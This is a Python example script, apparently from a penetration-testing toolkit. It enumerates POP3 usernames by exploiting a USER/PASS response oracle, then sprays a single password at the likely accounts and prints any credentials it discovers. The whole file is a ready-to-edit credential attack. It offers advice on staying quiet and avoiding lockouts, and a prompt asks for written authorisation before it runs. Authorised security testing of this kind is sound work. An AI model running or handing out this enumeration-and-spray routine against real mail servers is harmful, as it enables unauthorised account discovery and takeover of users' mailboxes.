"""POP3 user enumeration via the USER/PASS oracle, then spray only
the high-confidence hits.

Many POP3 servers leak user existence between USER and PASS — the
built-in ``pop3`` oracle picks that up, returning per-candidate
verdicts with a confidence score. This script:

1. Probes every candidate via the oracle (one round-trip per candidate).
2. Filters for ``confidence >= 0.7`` AND ``likely_exists=True``.
3. Sprays a single password against the surviving hits.

This two-stage pattern is much quieter than blasting the whole
candidate list with a spray: enumeration is one connection per name,
not one *login attempt* per name.

See docs/CRED_ATTACK.md before running.
"""

from __future__ import annotations

import logging
import sys

# --- Edit me -----------------------------------------------------------------

TARGET_HOST = "lab.example.internal"
TARGET_PORT = 995
USE_TLS = True

# A wider candidate list — enumeration is cheaper than spray attempts,
# so it's reasonable to probe more names here than you'd spray at.
CANDIDATES = [
    "alice",
    "bob",
    "carol",
    "dave",
    "eve",
    "frank",
    "grace",
    "heidi",
    "isaac",
    "judy",
    "ken",
    "leo",
    "mallory",
    "niaj",
    "oscar",
    "peggy",
]

# Spray a single password against the hits. Single-password keeps
# the per-user attempt count to one — well under any reasonable
# lockout threshold.
SPRAY_PASSWORD = "Spring2026!"

ENUM_CONFIDENCE_THRESHOLD = 0.7
RATE_PER_MIN = 30.0


# --- Confirmation gate -------------------------------------------------------


def confirm() -> bool:
    target = f"pop3{'s' if USE_TLS else ''}://{TARGET_HOST}:{TARGET_PORT}"
    print(f"This script will probe {len(CANDIDATES)} candidate usernames at:")
    print(f"  {target}")
    print("then spray ONE password against the high-confidence hits.")
    print("Only proceed if you have written authorisation to test this host.")
    answer = input("Type 'yes' to continue, anything else to abort: ").strip().lower()
    return answer in ("y", "yes")


def main() -> int:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(name)s: %(message)s",
    )
    if not confirm():
        print("Aborted.", file=sys.stderr)
        return 2

    from core.cred_attack import (
        AttemptOutcome,
        AttemptResult,
        EnumResult,
        enumerate_users,
        spray,
    )
    from core.profiles import ConnectionProfile

    profile = ConnectionProfile(
        name="example-pop3-enum",
        protocol="pop3",
        host=TARGET_HOST,
        port=TARGET_PORT,
        pop3_ssl=USE_TLS,
    )

    print("Stage 1 — user enumeration (oracle):")

    def show_enum(r: EnumResult) -> None:
        flag = "✓" if r.likely_exists else "·"
        print(
            f"  [{flag}] {r.username:<14} conf={r.confidence:.2f}  {r.method}  ({r.notes})",
        )

    enum = enumerate_users(
        profile,
        candidates=CANDIDATES,
        method="auto",
        progress=show_enum,
        authorized=True,
    )

    hits = [
        r.username
        for r in enum.results
        if r.likely_exists and r.confidence >= ENUM_CONFIDENCE_THRESHOLD
    ]
    print()
    print(f"Stage 1 done. Hits ≥{ENUM_CONFIDENCE_THRESHOLD}: {hits}")

    if not hits:
        print("No high-confidence hits — nothing to spray.")
        return 0

    print()
    print(f"Stage 2 — single-password spray against {len(hits)} hits:")

    def show_spray(o: AttemptOutcome) -> None:
        marker = {
            AttemptResult.SUCCESS: "+",
            AttemptResult.LOCKOUT: "!",
            AttemptResult.ERROR: "?",
            AttemptResult.FAILED: "-",
            AttemptResult.SKIPPED: "·",
        }.get(o.result, "?")
        print(
            f"  [{marker}] {o.username:<14} {o.result.value:<8} {o.elapsed_s:>5.2f}s",
        )

    report = spray(
        profile,
        users=hits,
        password=SPRAY_PASSWORD,
        rate_per_min=RATE_PER_MIN,
        progress=show_spray,
        authorized=True,
    )
    print()
    print(report.summary())
    if report.successes:
        print("Discovered credentials:")
        for cred in report.successes:
            print(f"  {cred.username} : {cred.password}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
